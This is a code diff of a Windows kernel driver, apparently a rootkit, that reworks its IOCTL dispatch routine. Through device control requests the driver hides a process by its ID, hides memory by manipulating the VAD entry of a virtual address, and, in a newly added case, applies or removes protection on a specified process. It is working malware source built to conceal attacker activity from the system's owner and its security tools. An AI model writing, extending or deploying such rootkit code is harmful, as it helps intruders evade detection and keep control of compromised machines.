@@ -5,8 +5,8 @@
  *      used to handle IRP_MJ_CREATE/IRP_MJ_CLOSE requests
  */
 NTSTATUS TsIoCtlCreateClose(
-    IN OUT PDEVICE_OBJECT DriverObject, 
-    IN OUT PIRP           Irp
+    _In_ _Out_ PDEVICE_OBJECT DriverObject,
+    _In_ _Out_ PIRP           Irp
 ) {
     Irp->IoStatus.Status      = STATUS_SUCCESS;
     Irp->IoStatus.Information = 0;
@@ -77,11 +77,12 @@ FAILED:
  *      if the function succeeded to execute
  */
 NTSTATUS TsIoCtlDispatch(
-    IN OUT PDEVICE_OBJECT DeviceObject,
-    IN OUT PIRP           Irp
+    _In_ _Out_ PDEVICE_OBJECT DeviceObject,
+    _In_ _Out_ PIRP           Irp
 ) {
     PIO_STACK_LOCATION IrpStack = NULL;
     NTSTATUS           NtStatus = STATUS_SUCCESS;
+    ULONG              Length   = 0;
 
     /* get current irp stack */
     IrpStack = IoGetCurrentIrpStackLocation( Irp ); 
@@ -104,7 +105,7 @@ NTSTATUS TsIoCtlDispatch(
                 NtStatus = STATUS_INVALID_BUFFER_SIZE;
                 break;
             }
-
+            
             /* get process id & hide process */
             if ( Irp->AssociatedIrp.SystemBuffer ) {
                 Pid = * ( PULONG ) Irp->AssociatedIrp.SystemBuffer;
@@ -119,6 +120,8 @@ NTSTATUS TsIoCtlDispatch(
             } else {
                 NtStatus = STATUS_INVALID_PARAMETER;
             }
+
+            Length += sizeof( ULONG );
 
             break;
         }
@@ -154,6 +157,8 @@ NTSTATUS TsIoCtlDispatch(
                 NtStatus = STATUS_INVALID_PARAMETER;
             }
 
+            Length += sizeof( ULONG );
+
             break;
         }
 
@@ -162,7 +167,7 @@ NTSTATUS TsIoCtlDispatch(
             PRS_C_MEMORY_VAD MemoryVad = NULL;
 
             /* check if param has been specified */
-            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
+            if ( ! ( MemoryVad = Irp->AssociatedIrp.SystemBuffer ) ) {
                 NtStatus = STATUS_INVALID_PARAMETER;
                 break;
             }
@@ -173,26 +178,56 @@ NTSTATUS TsIoCtlDispatch(
                 break;
             }
 
-            MemoryVad = Irp->AssociatedIrp.SystemBuffer;
-
-            if ( MemoryVad->Hide ) 
-            {
-                /* hide memory by manipulating the VAD entry of virtual address */
-                if ( ! NT_SUCCESS( NtStatus = MemoryVadHide( MemoryVad->Pid, MemoryVad->Address ) ) ) {
-                    PRINTF( "Failed to hide VAD: Pid:[%ld] Address:[%p] Status:[%p]\n", MemoryVad->Pid, MemoryVad->Address, NtStatus )
-                    break; 
-                }
-            } else {
-                // MemoryVadUnHide( MemoryVad->Pid, MemoryVad->Address );
+            /* hide memory by manipulating the VAD entry of virtual address */
+            if ( ! NT_SUCCESS( NtStatus = MemoryVadHide( MemoryVad->Pid, MemoryVad->Address ) ) ) {
+                PRINTF( "Failed to hide VAD: Pid:[%ld] Address:[%p] Status:[%p]\n", MemoryVad->Pid, MemoryVad->Address, NtStatus )
+                break;
             }
+
+            Length += sizeof( RS_C_MEMORY_VAD );
 
             break;
         }
 
+        case RHAAST_IOCTL_PROCESS_PROTECT : PUTS( "RHAAST_IOCTL_PROCESS_PROTECT" )
+        {
+            PRS_C_PROCESS_PROTECTION Protection = NULL;
+
+            /* check if param has been specified */
+            if ( ! ( Protection = Irp->AssociatedIrp.SystemBuffer ) ) {
+                NtStatus = STATUS_INVALID_PARAMETER;
+                break;
+            }
+
+            /* check data input size */
+            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_PROCESS_PROTECTION ) ) {
+                NtStatus = STATUS_INVALID_BUFFER_SIZE;
+                break;
+            }
+
+            /* apply/remove protection on the specified process */
+            if ( ! NT_SUCCESS( NtStatus = ProcessProtect( Protection ) ) ) {
+                PRINTF( "Failed to protect process: %p\n", NtStatus )
+                break;
+            }
+
+            Length += sizeof( RS_C_PROCESS_PROTECTION );
+
+            break; 
+        }
+
         default: {
             NtStatus = STATUS_INVALID_PARAMETER;
+            Length   = 0;
         }
     }
+
+    /* set Irp request info */
+    Irp->IoStatus.Status      = NtStatus;
+    Irp->IoStatus.Information = Length;
+
+    /* set complete */
+    IoCompleteRequest( Irp, IO_NO_INCREMENT );
 
     return NtStatus;
 }
